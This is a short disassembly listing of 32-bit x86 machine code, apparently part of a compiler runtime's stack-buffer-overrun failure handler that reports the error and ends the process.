  4081a8:	89 85 d8 fc ff ff    	mov    %eax,-0x328(%ebp)
  4081ae:	a1 dc d5 40 00       	mov    0x40d5dc,%eax
  4081b3:	89 85 dc fc ff ff    	mov    %eax,-0x324(%ebp)
  4081b9:	ff 15 68 90 40 00    	call   *0x409068
  4081bf:	a3 40 df 40 00       	mov    %eax,0x40df40
  4081c4:	6a 01                	push   $0x1
  4081c6:	e8 39 00 00 00       	call   0x408204
  4081cb:	59                   	pop    %ecx
  4081cc:	6a 00                	push   $0x0
  4081ce:	ff 15 4c 90 40 00    	call   *0x40904c
  4081d4:	68 08 9c 40 00       	push   $0x409c08
  4081d9:	ff 15 28 90 40 00    	call   *0x409028
  4081df:	83 3d 40 df 40 00 00 	cmpl   $0x0,0x40df40
  4081e6:	75 08                	jne    0x4081f0
  4081e8:	6a 01                	push   $0x1
  4081ea:	e8 15 00 00 00       	call   0x408204
  4081ef:	59                   	pop    %ecx
  4081f0:	68 09 04 00 c0       	push   $0xc0000409
  4081f5:	ff 15 2c 90 40 00    	call   *0x40902c
  4081fb:	50                   	push   %eax
  4081fc:	ff 15 30 90 40 00    	call   *0x409030
  408202:	c9                   	leave
  408203:	c3                   	ret
  408204:	ff 25 b8 90 40 00    	jmp    *0x4090b8
